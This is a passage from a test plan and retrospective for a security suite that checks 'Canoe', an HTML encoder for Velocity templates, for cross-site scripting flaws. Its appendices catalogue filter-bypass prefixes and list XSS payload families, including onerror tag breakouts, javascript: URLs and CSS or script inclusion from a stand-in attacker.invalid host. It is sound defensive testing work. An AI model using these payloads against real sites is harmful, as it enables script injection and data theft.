T15 (event handler matrix) and T17 (CSS) are the highest-value single tasks: they cover F1, F2, and
F4, which are three of the five findings that yield arbitrary script execution. If the effort has to
be cut short, land those two plus T8's `<`-freedom property and T23's steering property, which
together protect the one thing that currently works.

Phase 4 is worth deferring only if browser install is a genuine blocker; T27 in particular should not
be skipped, because a browser tier without a proven oracle is worse than no browser tier.

---

## 8. Risks and open questions

**The ledger can rot into a bug rubber-stamp.** If verdicts are set by running the code and
recording the output, the suite documents bugs as intended behaviour. Mitigation: verdicts are set by
running *and then reviewed against the sink by a human*, and every `KNOWN_VULNERABLE` entry must cite
a finding ID or open a new one. A verdict with no citation is a review failure.

**Browser behaviour drifts.** Playwright ships browser builds that change; a vector that executes
today may be dead next year. That is why per-engine results are recorded rather than collapsed, and
why the ledger is about *Canoe's output*, not about whether a given 2026 Chromium runs it. A dead
vector is still a Canoe defect if Canoe emitted the payload live.

**Corpus size versus run time.** Appendix A is roughly 2,000 base cases; multiplied by the payload
families that is a large number of Velocity renders. They are fast in-JVM (measured: sub-millisecond
each), so the Velocity tier is fine. The browser tier is not, hence the `browserRelevant` filter. If
the Velocity tier ever exceeds ~30 seconds, split by sink category into separate Gradle tasks rather
than trimming coverage.

**Open question — should the suite assert the *fixed* behaviour too?** An alternative to the ledger
is a parallel set of `@Disabled` tests asserting the post-fix behaviour, enabled as fixes land. It is
more explicit but doubles the case count and the two sets drift. Recommendation: skip it. The ledger
flip already forces the conversation at exactly the right moment, and T33's report makes the
remaining work visible without a second corpus.

**Open question — JUnit 5 migration.** T1 adds the vintage engine so `TestRouting` runs unchanged.
Whether to migrate it to Jupiter is a separate decision and explicitly out of scope here.

---

## 9. What the effort actually found

*Written 2026-07-26, on completing T34.*

**This started as a test-writing exercise for twelve findings and ended with twenty-four.** Half the
findings in `CANOE-SECURITY-REVIEW-2026-07-25.md` did not exist when this plan was written. They were
produced by the act of writing the tests, not by a second reading of the code — and that is the
headline, because it is an argument about method rather than about Canoe.

The twelve found by hand review, in order: F1–F12. The twelve found while building the suite:

| Finding | Found by | Shape |
|---|---|---|
| F13 | T11's brief, checked against the real render path | A recovery branch that cannot be reached |
| F14 | T6's comment-state table | A comment that never closes |
| F15 | T9's URL sweeps | Five ways `url()` corrupts author data |
| F16 | T8's encoder allowlist sweep | `js()` truncates astral code points; `css()` escapes are unterminated |
| F17 | T10's prefix matrix | The F4 reset also defeats `ATTR_JS` — a *recognised* handler is injectable |
| F18 | T11's rejection table | A comment before the DOCTYPE makes the DOCTYPE illegal |
| F19 | T6's exhaustive `on*` table | A third dead branch: the chain spells `onredystatechange` |
| F20 | T12's corpus build-out | Policy attributes, where encoding is inapplicable rather than insufficient |
| F21 | T14's `ATTR_*`/`CTX_*` pairing | `CTX_CSS` is unreachable, so its `encode()` arm is dead |
| F22 | T20's production-path engine | The factory's own default properties do not start an engine |
| F23 | T29's browser tier | A `style` attribute is decoded *twice* |
| F24 | T31's fuzzer | Attacker data **can** steer the parser — the review's corollary is false |

Five things are worth taking from that list.

**1. The exhaustive test found what the careful reading missed.** F1 was found by reading the source
and noticing two wrong buffer indices. F19 is the *same defect* in a third branch, and it was not
found by reading, because its indices are consecutive, its terminator index matches the number of
comparands, and its comment says the right thing — it is only wrong if you read thirteen character
literals back as a word. What found it was T6's table with one row per declared branch. The same
pattern produced F2's corrected count: "roughly 40" and a 64-name list were both hand counts of the
handlers somebody thought of, which is precisely the method that produced the defect. Measured
against the HTML Standard's own tables it is 18 of 94.

**2. The reviews of the tests found more wrong answers than the tests found in Canoe.** Five reviews
of this suite turned up three wrong verdicts in fourteen seeded cases, nine wrong URL judgements, 77
more wrongly-safe URL answers in a differential run against Node, a structural oracle blind to
`<head>`, two `KNOWN_VULNERABLE` pins that would have survived their own fix, a spec transcription
wrong in two directions, and three ledger rows claiming a browser sink that does not exist. Every one
of those was a test that was **green**. §8's warning — that a ledger can rot into a rubber stamp —
turned out to be the accurate risk, and asserting the ledger against an independent evaluator is what
made it survivable.

**3. Each new tier of instrument found a class the previous one could not.** The Velocity tier found
routing defects. The browser tier found F23, which needs a real CSS tokenizer running after a real
HTML parser, and it found a false positive in one of its own detectors — a substring host match — via
a corpus row that disagreed *in the direction that says the tool is wrong*. The fuzzer found F24,
which needs a template shape nobody writes on purpose. No amount of more of the previous instrument
would have produced any of them.

**4. F24 is the one that refutes the document it is recorded in.** The review's "attacker data can
never steer the parser" corollary is the argument its whole "what is not affected" section rests on,
and T23 states it as a property that passes over 275 templates and 52 payloads. It is false.
`HtmlEncoder.url()` copies a matched `http://` or `https://` prefix through unencoded, and the raw
colon re-runs `detectAttributePrefix()`, so in `<a href="$base$path">` the first reference decides
which encoder the second one gets. The hole was in T23's *quantification*, not in its statement: the
corpus varies one reference at a time, deliberately, so that a divergence is unambiguous. A generator
that did not know which shapes were interesting found it in a few hundred iterations. That is the
strongest single argument in this document for spending the time on T31, which the plan listed as
optional.

**5. Most of the remediation list still collapses onto one deleted line.** Item 1 —
`attributeContext = ATTR_HTML;` at `Canoe.java:224` — now closes F4, F17 **and** F24. Item 2, the
`on*` prefix rule, closes F1, F2 and F19. Item 3, failing closed on unknown attribute names, closes
F3 and F20 and immunises Canoe against every attribute the HTML Standard adds in future. Three edits
close thirteen findings, and the suite's 281 `KNOWN_VULNERABLE` invocations are the scoreboard for
them.

### What the suite is, at the end

- **5,489 tests** in `./gradlew test`, hermetic, no network, no browser, about **7 seconds**
  wall-clock including JaCoCo and the fuzz run.
- **155 tests** in `./gradlew browserTest`, about two minutes, Chromium only in this environment —
  Firefox and WebKit skip with the reason attached, so everything §5.2 says about cross-engine
  divergence remains **unmeasured**. *(This whole section is the snapshot at the end of the test
  plan, before any remediation; it is left as it was written. The browser tier is 270 tests on three
  engines since R28 — see "What is still missing" below and §6 of `REMEDIATION-PLAN.md`.)*
- **275 corpus cases / 996 invocations**, of which **281 are `KNOWN_VULNERABLE`** across 150 cases.
  That is the number to drive to zero, and `build/reports/canoe/matrix.md` is where it is kept.
- **Branch coverage of `Canoe.java` at 94.69% and `HtmlEncoder.java` at 99.42%** — 100% of the
  branches any input can reach and JaCoCo can observe. The 37 that remain are enumerated in
  `build.gradle` with the test that proves each one dead, and 26 of them *are* findings.

### What is still missing

- ~~**Cross-engine divergence is unmeasured.**~~ **Measured by R28**: Chromium, Firefox and WebKit
  all ran the whole tier, and the 65 rows measurable on all three produced byte-identical detector
  output. The `notBrowserObservable` axis is empty since Phase A, so no flag group rests on a
  single-engine observation any more. Two rows cannot be asked of Firefox and say so by name; see
  `BrowserCorpusTest.ENGINE_LIMITATIONS`. **With one qualification that outlives the bullet:** the
  two vectors §5.2 named as engine-sensitive, `xlink:href` and `srcdoc`, are both suppressed since
  R6, so their premise could not be exercised and their cross-engine agreement is agreement about
  silence. "No divergence" means no divergence among the rows that still emit something.
- ~~**F20's `nonce` row has no browser demonstration.**~~ **Built by R28**:
  `SinkSpecificBrowserTest.aSuppressedNonceCannotSatisfyACspThatAChosenNonceWould` serves a real
  `script-src 'nonce-…'` policy naming the *author's* nonce, shows the author's script admitted,
  shows a hand-written script carrying the same nonce admitted (F20's mechanism, and the
  calibration), and shows Canoe's rendered `nonce=""` refused. The header is on the response and not
  in the document, and only that one test can ask for it.
- ~~**§A.3 has a real gap**: `onbegin` and `onrepeat`.~~ **Closed by R28**; see §A.3.
- **The fuzzer's grammar is a grammar somebody wrote.** It removes the choosing of *shapes*, not the
  choosing of *vocabulary*. F24 came out of it on the first run; a second mechanism reachable only
  from a construct not in `HOSTS` or `NOISE` would not.

---

## Appendix A — The permutation catalogue

The axes below multiply out to the corpus. Not every combination is meaningful; the corpus is the
meaningful subset, and each section notes roughly how many cases it contributes.

### A.1 Insertion contexts (~40 cases)

Body text; between adjacent elements; RCDATA (`<textarea>`, `<title>`); RAWTEXT (`<xmp>`,
`<noembed>`, `<noscript>`, legacy `<iframe>` content); inside an HTML comment; inside a conditional
comment; inside a DOCTYPE; tag-name position (`<$data>`); attribute-name position (`<p $data="x">`);
attribute-value position under each of double-quoted, single-quoted, and unquoted; immediately after
`=` with no quote (F11); after `=` with whitespace then no quote; `<script>` body; `<style>` body;
inside an SVG subtree; inside a `<table>` (foster-parenting territory); and spanning a state
transition (`<a href="$a">$b</a>`).

### A.2 Attribute names (~90 cases)

*Recognised URI:* `background`, `dynsrc`, `lowsrc`, `href`, `src`.
*Recognised other:* `style` (CSS), `data` (→ `ATTR_CONTENT`, F7).
*Genuinely-safe plain text:* `id`, `class`, `title`, `alt`, `value`, `name`, `placeholder`,
`lang`, `dir`, `role`, `aria-label`, `data-*`, and — considered for the policy group and rejected —
`type`, `target`, `formtarget`. (`nonce` was in this list and has moved to the policy group; it is
inert as *text*, which is not the test. See §0.10 and F20.)
*Unrecognised URL-bearing:* `action`, `formaction`, `poster`, `cite`, `usemap`, `longdesc`,
`codebase`, `manifest`, `ping`, `srcset`, `imagesrcset`, `xlink:href`, `xml:base`, `href` on
`<base>`, `archive`, `profile`, `classid`.
*Unrecognised markup-bearing:* `srcdoc`.
*Unrecognised policy-bearing:* `content` on `<meta http-equiv>` (a refresh sink rather than a policy
one), `sandbox`, `nonce`, `rel`, `integrity`. The criterion for this group is F20's strict one — a
switch that turns a **security** control on or off, whose meaning is the letters themselves — and it
is written out on `SinkKind.POLICY`.
*Case and separator permutations:* `HREF`, `HrEf`, `ONCLICK`, `href =`, `href\t=`, `href\n=`,
`href\r\n=`, duplicate attribute, attribute after `/`, attribute with no value followed by another.

### A.3 Event handlers (116 cases, delivered by T15)

The 21 genuinely recognised names (expect `SUPPRESSED`); `onselect` and `onsubmit` (F1) and
`onreadystatechange` (F19), which are declared but dead; and the 91 unrecognised handlers — the HTML
Standard's 94 event handler content attributes (§8.1.8.2, tables 1–3) less the 18 Canoe recognises
and the 2 dead branches among them, plus §8.1.8.2 table 4's two `Document`-only IDL attributes, plus
the 16 defined by UI Events, CSS Animations, CSS Transitions, Pointer Events, Touch Events and the
Selection API that F2 enumerates. Plus `onredystatechange`, the misspelling F19's branch actually
matches, which is that finding's evidence rather than an attribute name. Plus the completeness guard
described in T15, whose spec list is checked in at
`src/test/resources/canoe/html-event-handler-attributes.txt`.

The "~60" this section first estimated came from F2's hand-written list, and both were wrong for the
same reason the defect exists: they counted the handlers somebody thought of. The "111 names" that
replaced it was wrong for a subtler version of the same reason — the checked-in list it was measured
against had been transcribed from the wrong section of the standard. See §0.11 and §0.12.

**Gap closed by R28.** SVG animation event attributes were absent except for `onend`, which Canoe
happened to recognise: `onbegin` and `onrepeat` are defined by the same SVG 1.1 section (§19, on
`<animate>`, `<set>`, `<animateMotion>` and `<animateTransform>`), take the same `ATTR_HTML`
fall-through, and had no case here and no entry in the resource file's exclusion list. R28 adds
`handler.onbegin` and `handler.onrepeat`, each on a real SMIL animation so the sink can actually fire
— `onbegin` dispatches on load with no user interaction, `onrepeat` on every repetition after the
first — and each an entry in the resource file's exclusion list saying why the name is out of scope
for a list derived from the HTML Standard and in scope for the corpus anyway. §A.3 is 118 cases.
The gap was worth recording rather than quietly closing for the reason that made it a gap: a
completeness guard is only as complete as the list it reads, and "not in the standard's list" is not
"not worth a case".

### A.4 Attribute value prefixes (~45 cases)

Exact `javascript:`, `asfunction:`, `data:`, `livescript:`, `mocha:`; case variants
(`JaVaScRiPt:`); whitespace-split (`java\tscript:`, `java\nscript:`, `java\x00script:`);
entity-encoded (`&#106;avascript:`, `&#x6A;avascript:`, `&NewLine;javascript:`); percent-encoded
(`%6Aavascript:`); leading control characters and leading whitespace; `vbscript:`, `view-source:`,
`blob:`, `filesystem:`, `file:`; protocol-relative `//`; backslash variants `\\/\\/`, `/\`,
`https:/\`; homoglyph colons (U+A789 `꞉`, fullwidth U+FF1A `：`); and the colon at value index 0
through 12 to pin the `bufLen == 10` boundary (F4, F5).

*Coverage note.* A payload is multiplied across every URL-bearing case by family, so this list is
covered by representatives rather than exhaustively: one entity form (`&#106;avascript:`) stands for
the hex and named ones, because all three exercise the same property — `html()` escapes the
ampersand, so the parser's one decode returns the reference as literal text — and `view-source:`
stands for the script-bearing schemes, because it is the only one of the four that also carries a
nested URL. The forms deliberately left out are noted here rather than silently dropped: `&#x6A;`,
`&NewLine;`, `blob:`, `filesystem:`, `file:`, and `https:/\`. The last three are pinned in
`UrlOracleTest` against Node instead, which is where a scheme-allowlist regression would show up
first. F17's three end-to-end handler cases also live in this section, since the colon window is the
same one.

### A.5 Payload families

See Appendix B.

### A.6 Velocity reference forms and directives (~35 cases, delivered by T19)

`$data`, `$!data`, `${data}`, `$!{data}`, `$data.method()`, `$data.property`, `$_x.asis($data)`,
`$!_x.asis($data)`, `${_x.asis($data)}` (does not bypass), `$_xy.asis($data)` (not a bypass),
`$_x.html($data)`, `#set` plain, `#set` with an interpolated string literal (F12), `#if`, `#foreach`,
`#macro`, `#parse`, `#include`, `#evaluate`, undefined reference, null value, non-`String` object
with a hostile `toString()`, collection, array, number, and two references inside one tag.

*Corrected by T19.* This section originally said an undefined reference "renders literally as
`$missing`". It does not, under Qlue: `buildDefaultVelocityProperties()` sets
`runtime.strict_mode.enable=true`, so `$missing` is a `MethodInvocationException`, a bound-but-null
`$data` is a `VelocityException`, and the quiet form covers only the second of the two. Intended
Velocity behaviour rather than a defect, and fail-closed — but it is why an unbound `$_x` is a
rendering failure rather than a silent bypass, which is the assertion T20 makes about
`allowDirectOutput()`.

### A.7 Malformed and hostile template shapes (~40 cases)

`<br/>`, `<hr/>`, `<img/>` (rejected — §3); bare `<` in body text (rejected); `</ p>`, `</>`
(rejected); tag names of 35, 36, and 37 characters (the `MAX_TAGNAME_LEN` boundary); attribute names
at the same boundary; `<html><!DOCTYPE html>` (rejected); C0 control characters in body text
(rejected); unclosed tags at end of output; unclosed attribute values; unclosed comments; unclosed
`<script>`; `</scriptfoo>` (F10); `<script>x = 1 <</script>` (F10, converse); nested `<script>`;
`<!--[if IE]>` conditional comments; `<![CDATA[`; and deeply nested elements.

### A.8 Writer-level permutations (~25 cases)

Every `Writer` entry point (T7); offsets of 0, mid-buffer, and ≥ length; zero-length writes; and the
chunk-splitting property (T21) applied to every corpus template.

### A.9 Browser-relevant subset (~150 cases)

Not everything needs a browser. A case is `browserRelevant` when its verdict depends on parser
behaviour rather than on Canoe's output alone: everything ledgered `KNOWN_VULNERABLE`; a
representative `SAFE` case per sink category (to prove the detectors stay quiet when they should);
all of F3's markup and URL sinks; F4's CSS cases; and the cross-engine-divergent legacy vectors.

**Browser-relevant is not the same question as browser-observable**, and conflating them is how a
suite acquires twenty tests that can only fail. *Relevant* asks whether the browser tier should load
the row at all; *observable* asks whether any shipping engine will act on it. A row can be relevant
and unobservable — a live `javascript:` URL that Canoe emitted into `srcset`, which no engine will
ever dereference — and for those the browser tier must expect a detector **miss** rather than treat
the silence as a ledger divergence. The distinction lives on `XssCase.isBrowserObservable(payload)`,
the current count is **45** such invocations out of 128 browser-relevant ones, and §5.2 has the table
and the reasoning. T28 reads the flag; a `KNOWN_VULNERABLE` row that is flagged unobservable asserts
"no detector fired", not "some detector fired". So the tier's real arithmetic is 59 invocations that
must fire and 69 that must not, and
`BrowserCorpusTest.theBrowserRelevantSubsetIsTheSizeTheCorpusClaims` pins all four numbers, because a
browser tier that quietly stops loading anything passes.

*Corrected 2026-07-26.* The count was 24 when T25–T29 were written, and running them moved it to 45.
Every one of the 21 additions is a row the ledger judged correctly about Canoe and the corpus had
mis-predicted about the browser — which is the direction this axis exists to absorb, and an argument
for setting it from measurement rather than from reasoning wherever a measurement is available.

---

## Appendix B — Payload families

Each family names what it is trying to reach, so a case can declare its intent rather than paste a
string.

| Family | Shape | Reaches |
|---|---|---|
| `INERT_MARKER` | `CANOEMARKERAAAA` | the differential oracle's baseline — no encoder touches it |
| `TAG_BREAKOUT` | `<img src=x onerror=…>` | body-context injection; must never survive |
| `QUOTE_BREAKOUT` | `');alert(1);//` and `");alert(1);//` | JS string literal escape in event handlers |
| `ENTITY_BREAKOUT` | `&#39;&#41;;alert&#40;1&#41;` | the F1/F2 mechanism, as its own control: paired with `QUOTE_BREAKOUT` in `handler.onsubmit`/`handler.onfocus`, where one escapes the string literal and the other arrives as inert text, which is what shows the parser decodes exactly once |
| `ATTR_BREAKOUT` | `" onmouseover="…` | attribute value termination; currently impossible, asserted anyway |
| `JS_URL` | `javascript:alert(1)` plus case, whitespace, NUL, entity, percent-encoded and `view-source:` variants (12) | `href`, `xlink:href`, `action`, `formaction` |
| `PROTOCOL_RELATIVE` | `//attacker.invalid/x.js` and both backslash spellings, `/\` and `\\` | F6 — off-origin script inclusion |
| `ABSOLUTE_OFFSITE` | `https://attacker.invalid/x.js` | F6 — same, via the regex's verbatim scheme |
| `CSS_INJECTION` | `red;position:fixed;top:0;…;background:url(//attacker.invalid/b)` | F4 — overlay, exfiltration, beaconing |
| `CSS_IMPORT` | `red;}@import url(//attacker.invalid/s.css);a{` | F4 — stylesheet inclusion from a `<style>` body |
| `SRCDOC_MARKUP` | `<img src=x onerror=…>` into `srcdoc` | F3 — needs double encoding, gets single |
| `META_REFRESH` | `0;url=//attacker.invalid/` | F3 — forced redirect via `content` |
| `BASE_HIJACK` | `//attacker.invalid/` into `<base href>` | retargets every subsequent relative URL |
| `DOM_CLOBBER` | `id`/`name` values colliding with globals (`document.body`, `location`) | not XSS directly, but breaks scripts that trust the DOM |
| `UNICODE_EDGE` | astral code points, lone surrogates, U+2028/U+2029, RTL overrides, homoglyph colons | encoder correctness and parser confusion |
| `CONTROL_CHARS` | NUL through U+001F, and U+007F | Canoe rejects most in body context; browsers strip some inside attributes |
| `LENGTH_STRESS` | values at and beyond `MAX_TAGNAME_LEN` and the 10-character prefix window | boundary conditions in `buf` |
| `BUFFER_RESIDUE_PREFIX` | benign preceding elements with attribute names of length 1–20 | F5 — the ordering dependence |
